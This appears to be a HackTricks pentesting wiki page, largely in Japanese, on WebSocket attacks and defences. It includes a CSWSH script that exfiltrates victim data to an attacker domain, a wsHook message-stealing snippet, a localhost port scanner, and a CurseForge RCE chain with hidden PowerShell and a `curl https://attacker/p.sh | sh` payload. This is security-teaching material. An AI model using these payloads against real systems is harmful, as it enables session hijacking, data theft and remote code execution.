# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## WebSocketsとは

WebSocket接続は初期の**HTTP**ハンドシェイクを介して確立され、**長時間維持される**ように設計されています。これによりトランザクションシステムを必要とせず、いつでも双方向のメッセージングが可能になります。したがって、ライブの金融データストリームのように**低レイテンシまたはサーバー発信の通信**を必要とするアプリケーションで特に有利です。

### WebSocket接続の確立

WebSocket接続の確立に関する詳細な説明は[**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)で確認できます。要約すると、WebSocket接続は通常クライアント側のJavaScriptを介して開始され、以下のようになります：
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
`wss` プロトコルは **TLS** で保護された WebSocket 接続を示し、`ws` は **保護されていない** 接続を示します。

接続確立中は、HTTP 上でブラウザとサーバーの間でハンドシェイクが行われます。ハンドシェイクでは、ブラウザがリクエストを送信しサーバーが応答します。以下の例に示します:

ブラウザがハンドシェイクリクエストを送信:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
サーバの handshake response:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
接続が確立されると、両方向でメッセージ交換が可能なまま接続は開いた状態になります。

**WebSocket ハンドシェイクの要点:**

- `Connection` および `Upgrade` ヘッダは WebSocket ハンドシェイクの開始を示します。
- `Sec-WebSocket-Version` ヘッダは要求される WebSocket プロトコルのバージョン（通常は `13`）を示します。
- `Sec-WebSocket-Key` ヘッダには Base64 エンコードされたランダム値が送られ、各ハンドシェイクが一意であることを保証します。これによりキャッシュプロキシによる問題を回避できます。この値は認証用ではなく、レスポンスが誤設定されたサーバやキャッシュによって生成されたものではないことを確認するためのものです。
- サーバのレスポンスに含まれる `Sec-WebSocket-Accept` ヘッダは `Sec-WebSocket-Key` のハッシュであり、サーバが WebSocket 接続を開く意図があることを検証します。

これらの要素によりハンドシェイクプロセスは安全かつ信頼性の高いものとなり、高効率なリアルタイム通信が可能になります。

### Linux コンソール

`websocat` を使うと WebSocket に対して raw 接続を確立できます。
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
または websocat サーバーを作成するには:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket 接続

現在のローカルネットワークからクライアントが**HTTP websocket**に接続していることを発見した場合、[ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing)を試みてクライアントとサーバー間でMitM攻撃を行うことができます。\
クライアントが接続しようとすると、次のものを使用できます:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets 列挙

**ツール** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **を使って、既知の** **vulnerabilities** を websockets 上で自動的に検出、フィンガープリント、検索できます。

### Websocket Debug tools

- **Burp Suite** は通常の HTTP 通信と非常に似た方法で MitM による websockets 通信をサポートします。
- The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** は、**history** の取得、**interception rules** の設定、**match and replace** ルールの使用、**Intruder** や **AutoRepeater** の利用などにより、Burp 内での Websocket 通信の管理を改善します。
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** 「**WebSocket/Socket.io Proxy**」の略で、Node.js で書かれたこのツールは、クライアントとサーバー間のすべての WebSocket および Socket.IO 通信をキャプチャ、インターセプト、カスタムメッセージの送信、および表示するためのユーザーインターフェースを提供します。
- [**wsrepl**](https://github.com/doyensec/wsrepl) はペネトレーションテスト向けに設計された **interactive websocket REPL** です。受信する websocket メッセージの観察と新しいメッセージの送信のためのインターフェースを提供し、この通信を自動化するための使いやすいフレームワークを備えています。
- [**https://websocketking.com/**](https://websocketking.com/) は **websockets** を使用して他のウェブと通信するための web アプリです。
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) は他の種類の通信/プロトコルと同様に、**websockets** を使用して他のウェブと通信するための web インターフェースを提供します。

## Decrypting Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) には websockets を使って web を起動するためのコードがあり、[**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) で解説を読むことができます。

## Websocket Fuzzing

Burp の拡張である [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) は現在 WebSocket メッセージの fuzz も可能にしています。詳細は [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner) を参照してください。

### WebSocket Turbo Intruder (Burp extension)

PortSwigger の WebSocket Turbo Intruder は、Turbo Intruder スタイルの Python スクリプトと高レートの fuzzing を WebSockets に提供します。BApp Store またはソースからインストールできます。以下の 2 つのコンポーネントを含みます。

- Turbo Intruder: カスタムエンジンを使用して単一の WS エンドポイントに高ボリュームのメッセージを送る機能。
- HTTP Middleware: ローカルの HTTP エンドポイントを公開し、ボディを永続接続上で WS メッセージとして転送することで、任意の HTTP ベースのスキャナーが WS バックエンドをプローブできるようにします。

基本的なスクリプトパターンは、WS endpoint を fuzz し、関連するレスポンスをフィルタするためのものです。
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
`@MatchRegex(...)` のようなデコレータを使って、単一のメッセージが複数のレスポンスを引き起こすときのノイズを減らす。

### HTTP の背後で WS をブリッジする (HTTP Middleware)

永続的な WS 接続をラップし、HTTP ボディを WS メッセージとして転送して、HTTP スキャナによる自動テストを行います:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
次にローカルにHTTPを送信します。ボディはWSメッセージとして転送されます:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
これにより、WS backends を操作しながら、“interesting” events（例: SQLi errors、auth bypass、command injection behavior）をフィルタリングできます。

### Socket.IO の処理 (handshake, heartbeats, events)

Socket.IO は WS の上に独自のフレーミングを追加します。必須のクエリパラメータ `EIO`（例: `EIO=4`）で検出してください。セッションは Ping (`2`) と Pong (`3`) で維持し、会話は `"40"` で開始してから、`42["message","hello"]` のようなイベントを送信します。

Intruder の例:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
HTTPアダプタのバリエーション:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Socket.IO を介した server‑side prototype pollution の検出

PortSwigger の安全な検出手法に従い、次のような payload を送信して Express の内部を汚染してみてください:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
If greetings or behavior change (e.g., echo includes "Polluted"), you likely polluted server-side prototypes. Impact depends on reachable sinks; correlate with the gadgets in the Node.js prototype pollution section. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

デフォルトのエンジンは1つの接続でメッセージをバッチ処理します（スループットは高いがレースには不向き）。複数のWS接続を立ち上げて並列にペイロードを送るには、THREADEDエンジンを使ってロジックの競合（double‑spend、token reuse、state desync など）を誘発します。まずはサンプルスクリプトから始め、`config()` 内の並列度を調整してください。

- 手法や代替手段は [Race Condition](race-condition.md) を参照（「RC in WebSockets」を参照）。

### WebSocket DoS: malformed frame “Ping of Death”

ヘッダで巨大なペイロード長を宣言しつつ本文を送らないような WS フレームを作成します。一部のWSサーバは長さを信用してバッファを事前確保するため、`Integer.MAX_VALUE` に近い値を設定すると Out‑Of‑Memory を引き起こし、リモートの認証不要な DoS を招く可能性があります。サンプルスクリプトを参照してください。

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- WS Logger を有効にして、内部IDを使ったメッセージのキャプチャと相関を行います。
- 複雑なアダプタでメッセージID処理を調整するために、`Connection` 上の `inc*`/`dec*` ヘルパーを使用します。
- `@PingPong`/`@Pong` のようなデコレータや `isInteresting()` のようなヘルパーはノイズを減らし、セッションを維持するのに役立ちます。

### Operational safety

高レートのWS fuzzingは多数の接続を開き、毎秒数千のメッセージを送信することがあります。malformed frames や高頻度の送信は実際の DoS を引き起こす可能性があります。許可された環境でのみ実行してください。

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**（別名 **cross-origin WebSocket hijacking**）は、WebSocketハンドシェイクにおける **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** の特異なケースとして分類されます。この脆弱性は、WebSocketハンドシェイクが **HTTP cookies** のみで認証を行い、**CSRF tokens** や同等の対策がない場合に発生します。

攻撃者は悪意のあるウェブページをホストし、脆弱なアプリケーションへクロスサイトのWebSocket接続を開始させることでこれを悪用できます。その結果、その接続は被害者のセッションの一部として扱われ、セッション処理にCSRF保護が欠けていることを突かれます。

この攻撃が成立するための要件は以下の通りです:

- websocket の認証が cookie ベースであること
- cookie が攻撃者のサーバからアクセス可能であること（通常は **`SameSite=None`** を意味します）、かつ Firefox の **Total Cookie Protection** が有効でない、または Chrome の第三者cookieがブロックされていないこと
- websocket サーバが接続の origin を確認していない、またはそれがバイパス可能であること

また以下にも注意してください:

- 認証がローカル接続（localhost やローカルネットワーク）に基づく場合、現在の保護ではこれを禁止していないため攻撃は可能です（詳細は [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/) を参照）。

### Simple Attack

websocket 接続を確立する際、cookie がサーバへ送信されます。サーバは送信された cookie を使って各ユーザをその websocket セッションに関連付けている可能性があります。

例えば、websocket サーバがユーザの会話履歴を返すためにメッセージ "READY" を送る必要がある設計であれば、接続を確立する簡単な XSS（接続時に cookie は自動的に送信され、被害者ユーザを認可する）で "READY" を送信することで、その会話履歴を取得できてしまいます。
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

このブログ記事 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) では、攻撃者は web socket 通信が行われているドメインのサブドメインで**execute arbitrary Javascript in a subdomain**することに成功しました。サブドメインだったため、**cookie**が**sent**され、さらに**Websocket didn't check the Origin properly**だったため、その Websocket と通信して**steal tokens from it**ことが可能になりました。

### Stealing data from user

なりすましたい web application (the .html files for example) をコピーし、websocket 通信が行われている script 内に次のコードを追加します:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
次に、`wsHook.js` ファイルを [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) からダウンロードし、**web ファイルがあるフォルダ内に保存してください**.\
Webアプリケーションを公開してユーザーを接続させることで、websocket 経由で送受信されるメッセージを盗むことができます:
```javascript
sudo python3 -m http.server 80
```
### CSWSH 対策

CSWSH 攻撃は、ユーザーが悪意のあるページに接続し、そのページがユーザーが既に接続している web ページへ websocket 接続を開き、リクエストがユーザーの cookies を送信することでそのユーザーとして認証されてしまう、という事実に基づきます。

現在では、この問題は簡単に防げます:

- **Websocket server checking the origin**: websocket server は接続元 (Origin) を常にチェックして、予期しないページからの接続を防ぐべきです。
- **Authentication token**: 認証を cookie に基づける代わりに、攻撃者に知られていないサーバー発行のトークン（anti-CSRF token のような）に基づいて websocket 接続を行わせることができます。
- **SameSite Cookie attribute**: `SameSite` を `Lax` または `Strict` に設定した Cookie は外部の攻撃者ページから被害サーバーへ送信されないため、Cookie ベースの認証は成功しません。なお Chrome はこのフラグが指定されていない Cookie に対してデフォルトで **`Lax`** を付与するようになり、デフォルトでより安全になっています。ただし、Cookie が作成されてから最初の 2 分間は **`None`** になり、その短い期間は脆弱になる点に注意してください（この挙動は将来的に変更される可能性があります）。
- **Firefox Total Cookie Protection**: Total Cookie Protection は Cookie を生成されたサイトに隔離することで機能します。各サイトが独自の cookie ストレージパーティションを持ち、第三者がユーザーの閲覧履歴を結びつけるのを防ぎます。これにより攻撃者のサイトが cookies にアクセスできなくなるため、**CSWSH unusable** になります。
- **Chrome third-party cookies block**: これにより `SameSite=None` の場合でも認証済みユーザーの cookie が websocket サーバーに送信されるのを防げる可能性があります。

### Localhost WebSocket abuse & browser port discovery

デスクトップランチャーはしばしばヘルパー（例: CurseForge の `CurseAgent.exe`）を起動し、`127.0.0.1:<random_port>` で JSON-RPC WebSockets を公開します。ブラウザは **loopback sockets に対して SOP を強制しません** ので、任意の Web ページがハンドシェイクを試みることができます。エージェントが任意の `Origin` 値を受け入れ、二次的な認証を省略すると、IPC インターフェースが JavaScript から直接リモート操作可能になります。

#### 公開されているメソッドの列挙

正当なセッションをキャプチャしてプロトコルの契約を把握します。例えば CurseForge は `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` のようなフレームを送出します。ここで `name` が RPC メソッドを示し、`args` は GUID、解像度、フラグ等の構造化オブジェクトを含みます。この形が分かれば、`createModpack` や `minecraftGetDefaultLocation` といった権限のあるタスクを注入ページから直接呼び出せます。

#### ブラウザベースのポート探索

ヘルパーがランダムな高位ポートにバインドするため、エクスプロイトはまず WebSockets 経由で localhost をブルートフォースします。Chromium 系ブラウザはスロットリングが始まるまで約 16k の失敗したアップグレードを許容するため、一時的なポート範囲を十分に探索できます。Firefox は数百回の失敗でクラッシュやフリーズしやすいため、実用的な PoC はしばしば Chromium を対象にします。

<details>
<summary>最小限のブラウザスキャナー</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

接続がハンドシェイクを通過してプロトコル固有のデータを返したら、そのソケットを RPC チェーンに再利用する。

#### JSON-RPC メソッドを連鎖させて RCE へ

The CurseForge exploit は、認証不要の 2 つの呼び出しをチェーンする:

1. `createModpack` → ユーザー操作なしで新しい `MinecraftInstanceGuid` を返す。
2. `minecraftTaskLaunchInstance` → `AdditionalJavaArguments` を通じて任意の JVM フラグを受け入れつつ、その GUID を起動する。

JNI/JVM の診断オプションは、即利用可能な RCE プリミティブを提供する。たとえば、metaspace を制限してクラッシュを発生させ、error hook を利用してコマンド実行を行う:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Unix ターゲットでは、ペイロードを `/bin/sh -c 'curl https://attacker/p.sh | sh'` に置き換えるだけでよい。アプリケーションコードに触れられない場合でも、JVM CLI を制御するだけで動作する。

この「create resource → privileged launch」パターンは updaters や launchers にしばしば現れる。メソッド (1) がサーバー側で追跡される識別子を返し、メソッド (2) がその識別子でコードを実行したりプロセスを生成したりするたびに、ユーザー制御の引数を注入できないか確認すること。

## Race Conditions

Race Conditions in WebSockets are also a thing, [詳しくはここを参照](race-condition.md#rc-in-websockets)。

## その他の脆弱性

As Web Sockets are a mechanism to **send data to server side and client side**, サーバーやクライアントが情報をどのように扱うかによって、**Web Sockets can be used to exploit several other vulnerabilities like XSS, SQLi or any other common web vuln using input of s user from a websocket.**

## **WebSocket Smuggling**

この脆弱性は、**bypass reverse proxies restrictions** を可能にすることで、（実際にはそうでなくても）**websocket communication was stablished** と誤認させ、攻撃者が **access hidden endpoints** できるようにする可能性がある。詳しくは次のページを確認してください：

{{#ref}}
h2c-smuggling.md
{{#endref}}

## 参考文献

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
